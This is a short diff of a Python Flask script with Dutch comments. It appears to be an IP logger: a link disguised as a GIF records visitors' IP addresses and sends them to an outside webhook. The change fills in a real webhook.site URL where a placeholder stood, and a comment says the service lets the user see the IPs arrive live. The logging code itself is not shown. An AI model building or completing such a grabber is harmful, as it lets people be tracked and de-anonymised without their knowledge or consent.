@@ -8,7 +8,7 @@ DESTINATION_GIF = "PLAK_HIER_JE_DIRECTE_GIF_LINK.gif"
 
 # Jouw persoonlijke "ontvanger" (bijv. een Webhook of een simpele externe log)
 # TIP: Gebruik een gratis service zoals 'webhook.site' om de IP's live binnen te zien komen.
-LOG_WEBHOOK = "PLAK_HIER_JE_WEBHOOK_URL_VOOR_LIVE_LOGS"
+LOG_WEBHOOK = "https://webhook.site/e30d740e-be7c-44e0-94cf-c8645e87d8ca"
 
 @app.route('/')
 def logger():
